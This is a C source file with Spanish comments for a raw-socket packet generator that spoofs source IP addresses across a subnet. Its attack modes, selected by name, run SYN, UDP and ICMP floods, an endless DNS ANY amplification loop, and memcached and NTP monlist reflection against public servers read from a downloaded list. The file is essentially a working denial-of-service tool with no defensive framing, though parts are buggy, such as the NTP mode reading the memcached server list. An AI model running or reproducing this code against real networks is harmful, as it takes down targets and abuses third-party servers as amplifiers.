#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include "./includes/udp.h"
#include "./includes/tcp.h"
#include "./includes/icmp.h"


int main(int argc, char *argv[]){

	char *ip_addr, *subnet_mask, *protocolo, *puerto, *destino;
    int j;

	// Recibimos los argumentos por linea de comandos
    for (j = 1; j < argc; j+=2) {
        if (strcmp(argv[j], "-src") == 0) {
			if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					ip_addr = argv[j + 1];
				} else {
					printf("Error: -src necesita un argumento.\n");
				}
            } else {
                printf("Error: -src necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-m") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					subnet_mask = argv[j + 1];
				} else {
					printf("Error: -m necesita un argumento.\n");
				}
            } else {
                printf("Error: -m necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-a") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					protocolo = argv[j + 1];
				} else {
					printf("Error: -a necesita un argumento.\n");
				}
            } else {
                printf("Error: -a necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-p") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					puerto = argv[j + 1];
				} else {
					printf("Error: -p necesita un argumento.\n");
				}
            } else {
                printf("Error: -p necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-dst") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					destino = argv[j + 1];
				} else {
					printf("Error: -dst necesita un argumento.\n");
				}
            } else {
                printf("Error: -dst necesita un argumento.\n");
                return 1;
            }
        } else {
            fprintf(stderr, "Packet generator usage: sudo %s -dst <dest_addr> -src <src_addr> -m <subnet_mask> -p <dest_port> -a <ataque>\n", argv[0]);
        	return 1;
        }
    }

    struct in_addr addr;
    struct in_addr mask;
    struct in_addr net_addr;
    struct in_addr broadcast_addr;
    uint32_t i, num_addrs;

	//Calculamos la cantidad de ips con la mascara proporcionada

    inet_pton(AF_INET, ip_addr, &addr);
    inet_pton(AF_INET, subnet_mask, &mask);

    net_addr.s_addr = addr.s_addr & mask.s_addr;
    broadcast_addr.s_addr = net_addr.s_addr | ~mask.s_addr;

    num_addrs = ntohl(broadcast_addr.s_addr) - ntohl(net_addr.s_addr) + 1;

	// Creamos un socket RAW donde indicamos con el flag IPPROTO_RAW que el paquete que enviamos
	// contiene el header ip y el header del protocolo correspondiente
	int sockfd = 0;
	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

	// Comprobamos que el socket se ha creado con exito
    if(sockfd == -1){
        perror("Ha habido un problema al crear el socket");
        exit(1);
    }

	// Iteramos por las ips calculadas con la mascara
    for(i = 0; i < num_addrs; i++){

		// Creamos las estructuras in_addr de las ips
        struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(net_addr.s_addr) + i;
        struct in_addr aux;
        aux.s_addr = htonl(curr_addr.s_addr);
        char *addr_src = inet_ntoa(aux);
        /*struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(net_addr.s_addr) + i;*/

		// Comprobamos el protocolo/ataque proporcionado por linea de comandos
		if(strcmp(protocolo, "udp") == 0){
			// direccion IP de destino
			struct sockaddr_in daddr;
			if(host_addr(&daddr, destino, atoi(puerto)) == 1){
				return 1;
			}

			// direccion IP de origen
			struct sockaddr_in saddr;
			if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
				return 1;
			}

			// Creamos el paquete udp que vamos a enviar
			char* datagram;
			int datagram_len;
			udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "Paquete custom");
			
			// Enviamos el paquete UDP al destino
			if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
			{
				perror("No se ha podido enviar el datagrama");
			} else {
				printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
			}

		} else if((strcmp(protocolo, "tcp") == 0)){
			// direccion IP de destino
			struct sockaddr_in daddr;
			if(host_addr(&daddr, destino, atoi(puerto)) == 1){
				return 1;
			}

			// direccion IP de origen
			struct sockaddr_in saddr;
			if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
				return 1;
			}

			// Creamos el paquete SYN TCP que vamos a enviar, inicio del TCP handshake
			char* packet;
			int packet_len;
			tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);

			// Enviamos el paquete SYN al destino
			if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
			{
				perror("No se ha podido enviar el paquete");
			} else {
				// Esperamos a recibir la respuesta, SYN-ACK, del destino al paquete SYN que se ha enviado
				char recvbuf[DATAGRAM_LEN];
				int received = receive_from(sockfd, recvbuf, sizeof(recvbuf), &saddr);
				if (received <= 0)
				{
					printf("receive_from() failed\n");
				}
				else
				{
					printf("successfully received %d bytes SYN-ACK!\n", received);
				}

				// Leemos la sequencia del paquete SYN-ACK recibido para enviar un paquete ACK
				// con dicho numero de vuelta indicando que se ha recibido dicho paquete
				uint32_t seq_num, ack_num;
				read_seq_and_ack(recvbuf, &seq_num, &ack_num);
				int new_seq_num = seq_num + 1;

				// Creamos y enviamos paquete ACK con el numero de sequencia previo como numero ack
				int sent;
				create_ack_packet(&saddr, &daddr, ack_num, new_seq_num, &packet, &packet_len);
				if ((sent = sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr))) == -1)
				{
					printf("sendto() failed\n");
				}
				else
				{
					printf("successfully sent %d bytes ACK!\n", sent);
				}
				close(sockfd);
			}
		} else if((strcmp(protocolo, "syn_flood") == 0)){
			// Envia paquetes SYN en bucle
			syn_flood(sockfd, destino, ip_addr, atoi(puerto));
		} else if((strcmp(protocolo, "memcached") == 0)){
			// Leemos las ips de servidores memcached del archivo descargado de https://github.com/SecOps-Institute/memcached-server-iplist
			FILE* mem_servers = fopen("./listas/memcached-servers.txt", "r");
			if (mem_servers == NULL) {
				printf("Failed to open the file.\n");
				return 1;
			}

			char linea[256];
			while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

				// Quitamos el salto de linea de las ips de la lista
				size_t len = strlen(linea);
				if (len > 0 && linea[len - 1] == '\n') {
					linea[len - 1] = '\0';
				}

				// direccion IP de destino
				struct sockaddr_in daddr;
				if(host_addr(&daddr, linea, 11211) == 1){
					return 1;
				}

				// direccion IP de origen
				struct sockaddr_in saddr;
				if(host_addr(&saddr, linea, 53) == 1){
					return 1;
				}

				// Creamos un datagrama udp con el comando stats para que el servidor responda con
				// estadisticas suyas al origen del paquete
				char* datagram;
				int datagram_len;
				udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n");
				
				if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
				{
					perror("No se ha podido enviar el datagrama");
				} else {
					printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
				}
			}

			fclose(mem_servers);
		} else if((strcmp(protocolo, "ntp") == 0)){
			// Leemos las ips de servidores ntp
			FILE* mem_servers = fopen("./listas/memcached-servers.txt", "r");
			if (mem_servers == NULL) {
				printf("Failed to open the file.\n");
				return 1;
			}

			char linea[256];
			while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

				// Quitamos el salto de linea de las ips de la lista
				size_t len = strlen(linea);
				if (len > 0 && linea[len - 1] == '\n') {
					linea[len - 1] = '\0';
				}

				// direccion IP de destino
				struct sockaddr_in daddr;
				if(host_addr(&daddr, linea, 123) == 1){
					return 1;
				}

				// direccion IP de origen
				struct sockaddr_in saddr;
				if(host_addr(&saddr, addr_src, 53) == 1){
					return 1;
				}

				// Comando monlist: devuelve el monitoreo de los datos del servidor ntp
				char ntp[8];
				ntp[0] = 0x17;
				ntp[1] = 0x00;
				ntp[2] = 0x03;
				ntp[3] = 0x2A;
				ntp[4] = 0x00;
				ntp[5] = 0x00;
				ntp[6] = 0x00;
				ntp[7] = 0x00;

				// Creamos datagrama udp con el comando monlist
				char* datagram;
				int datagram_len;
				udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp);
				
				if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
				{
					perror("No se ha podido enviar el datagrama");
				} else {
					printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
				}
			}

			fclose(mem_servers);
		} else if((strcmp(protocolo, "ssdp") == 0)){

			// direccion IP de destino
			struct sockaddr_in daddr;
			if(host_addr(&daddr, "239.255.255.250", 1900) == 1){
				return 1;
			}

			// direccion IP de origen
			struct sockaddr_in saddr;
			if(host_addr(&saddr, addr_src, (rand() % 6000)) == 1){
				return 1;
			}

			ssdp(sockfd, &daddr, &saddr);
		} else if((strcmp(protocolo, "dns_amp") == 0)){
			while(1){
				// direccion IP de destino
				struct sockaddr_in daddr;
				if(host_addr(&daddr, destino, atoi(puerto)) == 1){
					return 1;
				}

				// direccion IP de origen
				struct sockaddr_in saddr;
				if(host_addr(&saddr, addr_src, (rand() % 6000)) == 1){
					return 1;
				}

				// Creamos datagrama udp con el tipo de pregunta ANY
				char* datagram;
				int datagram_len;

				udp_dns(&saddr, &daddr, &datagram, &datagram_len);

				if(sendto (sockfd, datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen("\x03""www\x06""google\x03""com") + 1 + sizeof(dns_question), 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
				{
					perror("No se ha podido enviar el datagrama");
				} else {
					printf ("Datagrama enviado. Tamaño : %d \n" , ntohs(datagram_len));
				}
			}
		} else if((strcmp(protocolo, "udp_flood") == 0)){
			udp_flood(sockfd, addr_src, destino, atoi(puerto), "You are being flooded");
		} else if((strcmp(protocolo, "icmp_flood") == 0)){
			icmp_flood(sockfd, addr_src, destino, atoi(puerto));
		}
    }
}